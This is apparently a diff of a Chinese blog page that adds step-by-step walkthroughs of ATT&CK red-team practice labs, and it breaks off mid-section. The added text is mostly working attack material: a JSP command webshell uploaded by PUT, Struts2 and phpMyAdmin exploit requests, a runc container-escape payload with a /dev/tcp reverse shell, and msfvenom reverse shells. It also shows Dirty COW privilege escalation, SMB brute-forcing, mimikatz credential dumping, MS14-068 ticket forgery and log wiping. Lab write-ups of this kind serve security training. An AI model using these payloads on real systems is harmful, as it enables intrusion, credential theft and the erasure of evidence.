@@ -56,7 +56,10 @@
 <meta property="og:description" content="ATT&amp;amp;CK红队评估实战靶场(一)搭建好环境后,用nmap进行扫描 nmap -sV -p- 192.168.189.129 发现开启80，3306端口访问192.168.189.129:80网页">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA&#x2F;%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png">
-<meta property="og:updated_time" content="2020-09-09T15:18:31.271Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA&#x2F;proxychains.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA&#x2F;%E5%AE%9E%E6%88%98%E4%BA%94.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA&#x2F;%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE.png">
+<meta property="og:updated_time" content="2020-09-15T06:42:10.532Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;06&#x2F;ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA&#x2F;%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png">
 
@@ -219,7 +222,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-09 23:18:31" itemprop="dateModified" datetime="2020-09-09T23:18:31+08:00">2020-09-09</time>
+                <time title="修改时间：2020-09-15 14:42:10" itemprop="dateModified" datetime="2020-09-15T14:42:10+08:00">2020-09-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -341,7 +344,7 @@
 <p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p>
 </blockquote>
 <h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><blockquote>
-<p>./start </p>
+<p>./start.sh</p>
 </blockquote>
 <p>然后</p>
 <blockquote>
@@ -477,8 +480,8 @@
 <p>进行psexec传递</p>
 <p>先创建smb</p>
 <blockquote>
-<p>可以右键session创建</p>
-<p>也可以beacon&gt;spawn smb </p>
+<p>可以右键session创建监听smb</p>
+<p>beacon&gt;spawn smb </p>
 <p>再进行psexec传递</p>
 <p>监听smb</p>
 </blockquote>
@@ -499,6 +502,350 @@
 <p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p>
 <p>WEB机 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
 <p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png" alt></p>
+<h1 id="ATT-amp-CK红队评估实战靶场-三"><a href="#ATT-amp-CK红队评估实战靶场-三" class="headerlink" title="ATT&amp;CK红队评估实战靶场(三)"></a>ATT&amp;CK红队评估实战靶场(三)</h1><p>环境搭建完毕后,用nmap进行扫描</p>
+<blockquote>
+<p>nmap -sS -p- 192.168.1.1/24</p>
+<p>192.168.1.110   开启22 80 3306 端口</p>
+</blockquote>
+<p>访问80端口，发现是用 Joomla搭建的网站</p>
+<p>用joomscan进行扫描</p>
+<blockquote>
+<p>perl joomscan.pl -u <a href="http://192.168.1.110" target="_blank" rel="noopener">http://192.168.1.110</a></p>
+</blockquote>
+<p>发现登录页面<a href="http://192.168.1.110/administrator/" target="_blank" rel="noopener">http://192.168.1.110/administrator/</a></p>
+<p>发现配置文件<a href="http://192.168.1.110/configuration.php" target="_blank" rel="noopener">http://192.168.1.110/configuration.php</a>~</p>
+<p>在配置文件中发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public $dbtype = &apos;mysqli&apos;;</span><br><span class="line">public $host = &apos;localhost&apos;;</span><br><span class="line">public $user = &apos;testuser&apos;;</span><br><span class="line">public $password = &apos;cvcvgjASD!@&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>尝试连接mysql数据库</p>
+<blockquote>
+<p>mysql -h 192.168.1.110 -u testuser -P 3306 -p</p>
+<p>cvcvgjASD!@</p>
+</blockquote>
+<p>连接成功</p>
+<p> joomla默认后端编辑模板即可getshell</p>
+<p>因为数据表中存储的管理员密码是加密的 </p>
+<p> 根据 joomla 官方文档 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a> 执行 sql 语句在数据库中添加 admin2/secret 超级管理员，注意 sql 语句修改为目标数据表的前缀。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&apos;Administrator2&apos;, &apos;admin2&apos;,</span><br><span class="line"> &apos;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&apos;, &apos;&apos;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&apos;8&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>登录界面用admin2  secret登录成功</p>
+<p> Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files-&gt;New File 新建文件 shell.php，写入一句话木马。 </p>
+<p>蚁剑连接</p>
+<p><a href="http://192.168.1.110/templates/beez3/test.php" target="_blank" rel="noopener">http://192.168.1.110/templates/beez3/test.php</a></p>
+<p>尝试执行命令，返回ret=127，毫无疑问就是disable_functions的限制了 </p>
+<p>通过phpinfo发现禁用了如下函数，目标是linux </p>
+<p>没有禁用putenv函数 ,尝试利用LD_PRELOAD绕过 </p>
+<p>用蚁剑把 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 上传到目标的同一目录，注意 .so 文件需要根据目标系统架构选择，然后访问 bypass_diablefunc.php，cmd 是执行的命令，outpath是读写权限的目录，sopath是 .so 文件的绝对路径。</p>
+<p>工具下载地址： <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<blockquote>
+<p><a href="http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so" target="_blank" rel="noopener">http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so</a></p>
+</blockquote>
+<p>收集信息</p>
+<blockquote>
+<p>whoami     www-data </p>
+<p>ifconfig       192.168.93.120  </p>
+<p>cat /proc/version      </p>
+<p>Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 </p>
+</blockquote>
+<p>在/tmp/mysql/test.txt中找到</p>
+<blockquote>
+<p>adduser wwwuser<br>passwd wwwuser_123Aqx</p>
+</blockquote>
+<p>尝试ssh连接</p>
+<blockquote>
+<p>ssh <a href="mailto:wwwuser@192.168.1.110" target="_blank" rel="noopener">wwwuser@192.168.1.110</a></p>
+</blockquote>
+<p>192.168.1.110不是我们getshell的主机，后端应该是nginx反代，我们目前得到的ubuntu的IP地址应该是192.168.93.120</p>
+<blockquote>
+<p>cat /proc/version<br>Linux version 2.6.32-431.el6.x86_64 (<a href="mailto:mockbuild@c6b8.bsys.dev.centos.org" target="_blank" rel="noopener">mockbuild@c6b8.bsys.dev.centos.org</a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC) ) #1 SMP Fri Nov 22 03:15:09 UTC 2013</p>
+</blockquote>
+<p>版本在脏牛提权的范围内</p>
+<blockquote>
+<p>脏牛Linux本地提权漏洞复现(CVE-2016-5195)</p>
+<h6 id="漏洞范围："><a href="#漏洞范围：" class="headerlink" title="漏洞范围："></a>漏洞范围：</h6><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
+<h6 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h6><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p>
+<h6 id="简要分析："><a href="#简要分析：" class="headerlink" title="简要分析："></a>简要分析：</h6><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p>
+</blockquote>
+<p>上传exp到centos中</p>
+<p> <a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a> </p>
+<blockquote>
+<p>scp /root/dirtycow-master/dirty.c <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:dirty.c</p>
+</blockquote>
+<p> 使用<code>gcc -pthread dirty.c -o dirty -lcrypt</code>命令对dirty.c进行编译，生成一个dirty的可执行文件。 </p>
+<blockquote>
+<p>[wwwuser@localhost ~]$ ./dirty baji<br>File /tmp/passwd.bak already exists! Please delete it and run again</p>
+</blockquote>
+<blockquote>
+<p>rm /tmp/passwd.bak</p>
+</blockquote>
+<blockquote>
+<p>./dirty baji</p>
+<p>Done! Check /etc/passwd to see if the new user was created.<br>You can log in with the username ‘firefart’ and the password ‘baji’.</p>
+</blockquote>
+<p>可以cat /etc/passwd查看是否成功</p>
+<p> 切换 firefart/baji 用户，成功提权。 </p>
+<blockquote>
+<p>su fierfart</p>
+</blockquote>
+<p>scp /root/artifact.exe <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:artifact.exe</p>
+<p>用msf进行上线,先生成payload文件</p>
+<blockquote>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=4444 -f elf &gt; shell.elf</p>
+</blockquote>
+<p>然后scp进行上传</p>
+<blockquote>
+<p>scp shell.elf <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:shell.elf</p>
+</blockquote>
+<p>然后启动msf监听</p>
+<blockquote>
+<p>use exploit/multi/handler</p>
+<p>set payload linux/x86/meterpreter/reverse_tcp</p>
+<p>set lhost 192.168.1.128</p>
+<p>set lport 4444</p>
+<p>exploit</p>
+</blockquote>
+<p>进行内网探测</p>
+<blockquote>
+<p>run autoroute -s 192.168.93.0/24     在session下添加路由</p>
+<p>background     meterpreter放在后台 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">background</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>因为同时开6台太卡了，以下全是其他大佬的流程</p>
+<ul>
+<li><p>192.168.93.10 windows 2012</p>
+</li>
+<li><p>192.168.93.20 windows 2008</p>
+</li>
+<li><p>192.168.93.30 windows 7</p>
+<p>尝试爆破 windows 2008 的本地管理员 </p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/top1000.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p> 123qwe!ASD </p>
+<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>在爆破密码成功的基础上，使用 msf 开个 socks4 正向代理，配合 proxychains。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/proxychains.png" alt></p>
+<p>wmi 出现在所有的 windows 操作系统中，由一组强大的工具集合组成，用于管理本地或远程的 windows 系统。攻击者使用 wmi 攻击时 windows 系统默认不会在日志中记录这些操作，可以做到无日志、攻击脚本无需写入到磁盘，增加了隐蔽性。</p>
+<p>wmiexec 执行命令，搜集信息，wmiexec.py 下载地址 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -debug &apos;administrator:123qwe!ASD@192.168.93.20&apos;</span><br></pre></td></tr></table></figure>
+
+<p>也可以用psexec登陆win2008</p>
+<blockquote>
+<p>use exploit/windows/smb/psexec </p>
+<p>set payload windows/meterpreter/bind_tcp</p>
+<p> set rhost 192.168.93.20</p>
+<p> set smbuser Administrator </p>
+<p> set smbpass  123qwe!ASD </p>
+<p>run</p>
+</blockquote>
+<p>ipconfig /all 知道 dns 服务器即域控是 192.168.93.10。那么基本的内网拓扑也清楚了，一台 centos 反向代理了一个 web，centos 有两个网卡，web 服务后端在 ubuntu 上，三台 windows 组成域环境，ip 分别是 192.168.93.10，192.168.93.20，192.168.93.30，域控为 windows server 2012，ip 为 192.168.93.10。</p>
+<p>（反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。反向代理的工作原理是，代理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端。更多解释 <a href="https://www.zhihu.com/question/36412304" target="_blank" rel="noopener">https://www.zhihu.com/question/36412304</a></p>
+<p>反向代理优点：</p>
+<ul>
+<li>提高了内部服务器的安全</li>
+<li>加快了对内部服务器的访问速度</li>
+<li>节约了有限的IP资源</li>
+</ul>
+<p>）</p>
+<p> tasklist /V 查看进程（显示对应用户），发现TEST域进程，可以尝试抓密码。 </p>
+<p>kali 使用 smbclient 通过代理连接 windows server 2008 上传 mimikatz。下载地址 <a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.93.20/C$ -U administratorput mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<p>wmiexec 远程执行 mimikatz 成功得到域管理员密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br></pre></td></tr></table></figure>
+
+<p>IPC$（Internet Process Connection）是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。利用IPC$连接者可以与目标主机建立一个连接，得到目标主机上的目录结构、用户列表等信息。</p>
+<p>利用条件：</p>
+<ol>
+<li>管理员开启了默认共享</li>
+<li>139或445端口开放</li>
+</ol>
+<p>ipc 远程连接读 flag.txt。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.10\admin$ zxcASDqw123!! /user:test\administrator   #系统默认路径c:\windows\下</span><br><span class="line">dir \\192.168.93.10\C$\users\administrator\Documents</span><br><span class="line">type \\192.168.93.10\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="ATT-amp-CK红队评估实战靶场-四"><a href="#ATT-amp-CK红队评估实战靶场-四" class="headerlink" title="ATT&amp;CK红队评估实战靶场(四)"></a>ATT&amp;CK红队评估实战靶场(四)</h1><p>搭建环境后，docker要手动启动</p>
+<p> 需要启动的环境分别为：s2-045、CVE-2017-12615、 cve-2018-12613 </p>
+<p>ubuntu为我们的web环境，其中的web环境需要手动开启，全部为docker环境，启动方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>开始getshell</p>
+<p>CVE-2017-12615 漏洞</p>
+<p>这是一个关于任意文件上传的漏洞，在tomcat中启用put方法会导致任意文件可以上传，从而导致服务器权限被获取 </p>
+<p>当web.xml中readonly设置为false时可以通过PUT/DELETE进行文件操控，漏洞就会触发。 </p>
+<p><strong>漏洞危害：</strong>泄露用户代码数据，或用户服务器被攻击者控制。<br><strong>影响范围：</strong>Apache Tomcat 7.0.0 – 7.0.79 </p>
+<p><a href="http://192.168.157.129:2002/" target="_blank" rel="noopener">http://192.168.157.129:2002/</a></p>
+<p>抓包上传put</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.157.129:2002</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami</a></p>
+</blockquote>
+<blockquote>
+<p>root\n</p>
+</blockquote>
+<p>也可以上传冰蝎的shell.jsp文件</p>
+<p>进行连接</p>
+<p>CVE-2018-12613,这个是一个phpmyadmin的洞，也就是文件包含，利用起来也还算方便，方法如下（环境为config模式，可直接使用test账户登录）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.104:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>至于包含shell也是比较简单的，select执行一个php代码，包含自己的session即可。</p>
+<p>下面是st2-045，st2系列也是一个经典的系列，直接构造下面的数据包即可rce。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.8,es;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: %&#123;#context[&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;].addHeader(&apos;vulhub&apos;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>三个漏洞都完成了</p>
+<p>下面进行docker逃逸CVE-2019-5736</p>
+<p> 漏洞影响在默认设置下运行的Docker容器，并且攻击者可以使用它来获得主机上的root级访问权限。 </p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。<br>像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。<br>在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
+<li>宿主机利用攻击者提供的image来创建一个新的container 。</li>
+<li>拥有container root权限，并且该container后续被docker exec attach。</li>
+</ul>
+<p>一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>docker version &lt;=18.09.2<br>RunC version &lt;=1.0-rc6</p>
+<p> 编译go脚本生成攻击payload。<br>（<a href="https://github.com/Frichetten/CVE-2019-5736-PoC）" target="_blank" rel="noopener">https://github.com/Frichetten/CVE-2019-5736-PoC）</a> </p>
+<p> 将go脚本中的命令修改为反弹shell </p>
+<p>var payload = “#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.157.128/4444 0&gt;&amp; 1”</p>
+<p> 编译生成payload</p>
+<p>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</p>
+<p>将该payload拷贝到docker容器中</p>
+<p> 执行payload</p>
+<p> 攻击者开启nc监听 </p>
+<p> 受害者启动docker容器时，触发payload。 </p>
+<p> 成功反弹shell。 </p>
+<p>这里我先用冰蝎上传msf的payload</p>
+<blockquote>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.157.128 LPORT=5555 -f raw &gt; shell1.jsp</p>
+</blockquote>
+<p>然后msf监听</p>
+<blockquote>
+<p>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp<br>payload =&gt; java/jsp_shell_reverse_tcp<br>msf5 exploit(multi/handler) &gt; set lhost 192.168.157.128<br>lhost =&gt; 192.168.157.128<br>msf5 exploit(multi/handler) &gt; set lport 5555<br>lport =&gt; 5555<br>msf5 exploit(multi/handler) &gt; exploit</p>
+</blockquote>
+<p>得到shell</p>
+<p>运行main文件</p>
+<blockquote>
+<p>chmod 777 ./main</p>
+<p>./main</p>
+</blockquote>
+<p>然后开始用msf监听4444端口</p>
+<p>模拟docker进入主机</p>
+<blockquote>
+<p>docker exec -it 09dd4e5bfa91 /bin/bash</p>
+</blockquote>
+<p>kali就接收到主机的shell， 实现了docker容器逃逸 </p>
+<p>只是一个普通的shell，想办法把它升级为meterpreter</p>
+<blockquote>
+<p>post/multi/manage/shell_to_meterprete </p>
+</blockquote>
+<p>然后添加路由</p>
+<blockquote>
+<p>run autoroute -s 192.168.183.0/24</p>
+</blockquote>
+<p>用arp- a扫描  发现192.168.183.128</p>
+<p>然后用 auxiliary/scanner/portscan/tcp 进行扫描</p>
+<p>开放135端口尝试用 smb_version 进行探测系统版本信息</p>
+<p> 发现是win7 sp1且位于DEMO域中 </p>
+<p> 使用ms17-010 没有成功</p>
+<p>有两种方法</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>使用<code>eternalblue_doublepulsar</code>得到了<code>shell</code><br>下载链接：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>参考文章：<a href="https://blog.csdn.net/userpass_word/article/details/85124266" target="_blank" rel="noopener">https://blog.csdn.net/userpass_word/article/details/85124266</a> </p>
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p> 有可能是uac的问题，换成bypassUAC的进行测试 </p>
+<p>然后收集域信息</p>
+<blockquote>
+<p>net user /domain</p>
+<p>net group “Domain controllers” /domain</p>
+<p>ping WIN-ENS2VR5TR3N.demo.com</p>
+<p>有现成的<code>ms14-068.exe</code>以及<code>mimikatz</code>还有以及生成好的<code>TGT</code>文件 </p>
+</blockquote>
+<p>使用<code>mimikatz</code>抓取<code>douser</code>的密码，利用<code>whoami /all</code>获取<code>douser</code>的<code>Sid</code><br>然后利用<code>ms14-068</code>生成票据 </p>
+<blockquote>
+<p>MS14-068.exe -u <a href="mailto:douser@demo.com" target="_blank" rel="noopener">douser@demo.com</a> -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</p>
+</blockquote>
+<p>然后导入票据 </p>
+<blockquote>
+<p>Kerberos::ptc c:\users\douser\Desktop\TGT_douser@demo.com.ccache</p>
+</blockquote>
+<p>成功获得域管理员权限 </p>
+<p>利用<code>copy</code>命令上传一个正向<code>shell</code>，通过<code>psexec</code>连接域控执行打一个<code>shell</code>回来 </p>
+<p>上传<code>mimikatz.exe</code>，抓取到域管理员明文密码 </p>
+<p> 最后三台主机运行<code>clearev</code>清除日志痕迹 </p>
+<h1 id="ATT-amp-CK红队评估实战靶场-五"><a href="#ATT-amp-CK红队评估实战靶场-五" class="headerlink" title="ATT&amp;CK红队评估实战靶场(五)"></a>ATT&amp;CK红队评估实战靶场(五)</h1><p>运行phpstudy</p>
+<p>然后进行扫描</p>
+<blockquote>
+<p>nmap -sV -p- 192.168.135.0/24</p>
+<p>map scan report for 192.168.135.150<br>Host is up (0.00042s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)<br>3306/tcp open  mysql   MySQL (unauthorized)</p>
+</blockquote>
+<p>然后访问</p>
+<p>发现是ThinkPHP V5</p>
+<p>可以用goby进行扫描</p>
+<blockquote>
+<p>描述</p>
